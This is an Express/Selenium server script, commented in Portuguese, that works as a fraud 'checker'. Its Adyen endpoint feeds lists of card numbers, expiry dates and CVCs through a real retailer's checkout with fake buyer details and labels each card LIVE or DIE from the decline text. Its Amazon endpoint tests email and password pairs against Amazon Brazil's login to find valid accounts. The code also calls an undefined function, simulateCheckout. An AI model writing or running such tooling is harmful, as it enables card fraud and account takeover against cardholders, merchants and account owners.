import express from 'express';
import cors from 'cors';
import { Builder, By, until, Select } from 'selenium-webdriver';
import chrome from 'selenium-webdriver/chrome.js';
import picocolors from 'picocolors';

const app = express();
const port = 8080;

app.use(cors());
app.use(express.json());

async function chkAdyen(cardInfo) {
    let card = cardInfo.split('|');
    let result;

    let options = new chrome.Options();
    options.addArguments('--log-level=3');
    options.addArguments('--disable-logging');
    options.addArguments('--no-sandbox');
    options.addArguments('--disable-gpu');

    let driver = await new Builder().setChromeOptions(options).forBrowser('chrome').build();

    try {
        await driver.get('https://www.woolovers.us/product/AddYouMayAlsoLikeProduct?productId=26807');

        try {
            let cookiesAccept = await driver.wait(until.elementLocated(By.id('onetrust-accept-btn-handler')), 5000);
            if (cookiesAccept && await cookiesAccept.isDisplayed()) {
                await cookiesAccept.click();
            }
        } catch (error) {
            console.log('Botão de cookies não encontrado, continuando...');
        }

        result = await simulateCheckout(driver, card);

    } catch (error) {
        console.log(picocolors.red(`[ ERROR ] » ${cardInfo} » [ Erro ao processar: ${error.message} ]`));
        result = { status: 'ERROR', message: error.message };
    } finally {
        await driver.quit();
    }
    return result;
}

// =============== API ADYEN ======================
async function adyenChk(driver, card) {
    function getRandomLetters(length) {
        const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
        return Array.from({ length }, () => letters.charAt(Math.floor(Math.random() * letters.length))).join('');
    }

    function getRandomNumbers(length) {
        const numbers = '1234567890';
        return Array.from({ length }, () => numbers.charAt(Math.floor(Math.random() * numbers.length))).join('');
    }

    try {
        // Processamento do checkout (exemplo baseado no seu código)
        let checkout = await driver.wait(
            until.elementLocated(By.className('btn form-submit btn-primary btn-checkout js-checkout')),
            20000
        );
        await driver.executeScript("arguments[0].scrollIntoView(true);", checkout);
        await driver.executeScript("arguments[0].click();", checkout);

    
        let inputMail = await driver.wait(until.elementLocated(By.id('RegisterEmailAddress')), 10000);
        let buttonSubmit = await driver.wait(until.elementLocated(By.xpath('//*[@id="register"]/form/div[3]/button')), 10000);
        
        await driver.sleep(2000)
        
        await inputMail.sendKeys(`${getRandomLetters(10)}@hotmail.com`);
        
        await driver.sleep(2000)
        
        await driver.executeScript("arguments[0].click();", buttonSubmit);

        await driver.wait(until.elementLocated(By.xpath('//*[@id="lookupAddress"]/div[3]/p/span')), 50000).click();
        
        await driver.sleep(2000)

        await driver.wait(until.elementLocated(By.xpath('//*[@id="saveAddress"]/div[1]/input')), 10000).sendKeys(getRandomLetters(8));
        
        await driver.sleep(2000)
        
        await driver.wait(until.elementLocated(By.xpath('//*[@id="saveAddress"]/div[2]/input')), 10000).sendKeys(getRandomLetters(8));
        
        await driver.sleep(2000)

        await driver.wait(until.elementLocated(By.xpath('//*[@id="saveAddress"]/div[3]/input')), 10000).sendKeys(`202${getRandomNumbers(6)}`);
        
        await driver.sleep(2000)

        await driver.wait(until.elementLocated(By.xpath('//*[@id="saveAddress"]/div[4]/div[1]/input')), 10000).sendKeys('123 Main Street');
        
        await driver.sleep(2000)

        await driver.wait(until.elementLocated(By.xpath('//*[@id="saveAddress"]/div[4]/div[4]/input')), 10000).sendKeys('Houston');
        
        await driver.sleep(2000)

        
        await driver.wait(until.elementLocated(By.xpath('//*[@id="saveAddress"]/div[4]/div[6]/input')), 10000).sendKeys('Texas');
        
        await driver.sleep(2000)

        await driver.wait(until.elementLocated(By.xpath('//*[@id="saveAddress"]/div[4]/div[7]/input')), 10000).sendKeys('77002');
        
        await driver.sleep(2000)
        
        const submitAdrForm = await driver.wait(until.elementLocated(By.xpath('//*[@id="deliveryAddress"]/div[3]/div[2]/button')), 10000)
        
        await driver.sleep(2000)

        await driver.executeScript("arguments[0].click();", submitAdrForm);

        await driver.sleep(2000)
        
        await driver.wait(until.elementLocated(By.xpath('/html/body/div[3]/div/div[3]/div[1]/div/div[7]/div/div/div[2]/div[1]/div[1]/div[2]/div/label/span')), 10000).click();
        
        await driver.sleep(2000)

        await driver.wait(until.elementLocated(By.xpath('/html/body/div[3]/div/div[3]/div[1]/div/div[9]/div/div/div[5]/div/div[1]/div/button')), 10000).click();

        await driver.wait(until.elementLocated(By.id('adyen-encrypted-form-number')), 10000).sendKeys(card[0].trim());
        
        await driver.sleep(2000)

        let selectMonth = new Select(await driver.wait(until.elementLocated(By.id('adyen-encrypted-form-expiry-month')), 10000));
        
        await driver.sleep(2000)

        let selectYear = new Select(await driver.wait(until.elementLocated(By.id('adyen-encrypted-form-expiry-year')), 10000));
        
        await driver.sleep(2000)

        await selectMonth.selectByValue(card[1].trim());
        
        await driver.sleep(2000)

        await selectYear.selectByValue(card[2].trim());
        
        await driver.sleep(2000)

        await driver.wait(until.elementLocated(By.id('adyen-encrypted-form-cvc')), 10000).sendKeys(card[3].trim());
        
        await driver.sleep(2000)

        await driver.wait(until.elementLocated(By.id('adyen-encrypted-form-holder-name')), 10000).sendKeys('Joseph Alex');

        await driver.sleep(2000)

        const submitCardForm = await driver.wait(until.elementLocated(By.xpath('//*[@id="adyen-encrypted-form"]/div[6]/button')), 10000)
        
        await driver.sleep(2000)

        await driver.executeScript("arguments[0].click();",submitCardForm);

        await driver.sleep(2000)

        let bodyText = await driver.findElement(By.tagName('body')).getText();
        if (bodyText.includes('Please enter a valid card number')) {
            return { status: 'INVALID', message: `${card.join('|')} [Insira um número de cartão válido]` };
        } else if (bodyText.includes('Please enter a valid expiry date')) {
            return { status: 'INVALID', message: `${card.join('|')} [Insira uma data de validade válida]` };
        }

        let errorCard;
        try {
            errorCard = await driver.wait(
                until.elementLocated(By.css('.checkout-alerts--payment.alert.alert-danger')),
                20000
            );

            const alertText = await errorCard.getText();

            if (alertText.includes('CVC Declined')) {
                return { status: 'LIVE', message: `${card.join('|')} [ ${alertText} ]` };
            } else if (alertText.includes('Not enough balance')) {
                return { status: 'LIVE', message: `${card.join('|')} [ ${alertText} ]` };
            } else {
                return { status: 'DIE', message: `${card.join('|')} [ ${alertText} ]` };
            }
        } catch (error) {
            const currentUrl = await driver.getCurrentUrl();
            if (currentUrl.includes('https://www.woolovers.us/securecheckout/orderdetail?fail=true')) {
                return { status: 'DIE', message: `${card.join('|')} [ VBV ]` };
            }
        }
    } catch (error) {
        console.log(picocolors.red(`[ ERROR ] » ${card.join('|')} » [ ${error.message} ]`));
        return { status: 'ERROR', message: `${card.join('|')} [ ${error.message} ]` };
    }
}

// =============== API AMAZON ======================
async function chkAmazon(email, senha) {
    let options = new chrome.Options();
    options.addArguments('--log-level=3');
    options.addArguments('--disable-logging');
    options.addArguments('--disable-gpu');

    let driver = await new Builder().setChromeOptions(options).forBrowser('chrome').build();
    let result;

    try {
        // ================= MAIN PAGE TO LOGIN =======================
        await driver.get('https://www.amazon.com.br/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com.br%2F%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=brflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0');

        // let loginButton = await driver.wait(until.elementLocated(By.id('nav-link-accountList')), 10000);
        // await loginButton.click();

        // ================== INSERT EMAIL/NUMBER =====================
        let inputEmail = await driver.wait(until.elementLocated(By.id('ap_email')), 10000);
        let continueButton = await driver.wait(until.elementLocated(By.id('continue')), 10000);

        await inputEmail.sendKeys(email);
        await continueButton.click();

        await driver.sleep(5000);

        let textElement = await driver.wait(until.elementLocated(By.tagName('body')), 10000);
        let text = await textElement.getText();

        if (text.includes('Não encontramos uma conta associada a este endereço de e-mail')) {
            result = { status: 'DIE', message: `${email} [ Não encontramos uma conta associada a este endereço de e-mail ]` };
        } else {
            await driver.sleep(2000);

            let inputPassw = await driver.wait(until.elementLocated(By.name('password')), 10000);
            let loginButton = await driver.wait(until.elementLocated(By.id('auth-signin-button')), 10000);

            await inputPassw.sendKeys(senha);
            await loginButton.click();

            await driver.sleep(2000);

            textElement = await driver.wait(until.elementLocated(By.tagName('body')), 10000);
            text = await textElement.getText();

            if (text.includes('Sua senha está incorreta')) {
                result = { status: 'DIE', message: `${email}  » [ Login inválido ]` };
            } else {
                result = { status: 'LIVE', message: `${email} » [ Login válido ]` };
            }
        }
    } catch (error) {
        console.log(picocolors.red(`[ ERROR ] » ${email} » [ Houve um erro ao tentar checar: ${error} ]`));
        result = { status: 'ERROR', message: error.message };
    } finally {
        await driver.quit();
    }
    return result;
}


app.post('/api/amz', async (req, res) => {
    const { cc } = req.body;

    if (!cc || !Array.isArray(cc)) {
        return res.status(400).json({ error: 'Credenciais inválidas' });
    }

    const results = [];
    for (const cred of cc) {
        const [email, senha] = cred;
        const result = await chkAmazon(email, senha);
        results.push(result);
    }

    res.json(results);
});

app.post('/api/adyen', async (req, res) => {
    const { cc } = req.body;

    if (!cc || !Array.isArray(cc)) {
        return res.status(400).json({ error: 'O parâmetro obrigatorio não foi inserido' });
    }

    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Transfer-Encoding', 'chunked');

    
    for (const card of cc) {
        await new Promise(resolve => {
            setImmediate(async () => {
                try {
                    const result = await chkAdyen(card);
                    res.write(JSON.stringify(result) + '\n');
                } catch (error) {
                    res.write(JSON.stringify({ error: `Erro ao testar o cartão: ${error.message}` }) + '\n');
                }
                resolve();
            });
        });
    }

    res.end();
});


app.listen(port, () => {
    console.log(`API's Rodando em http://localhost:${port}`);
});
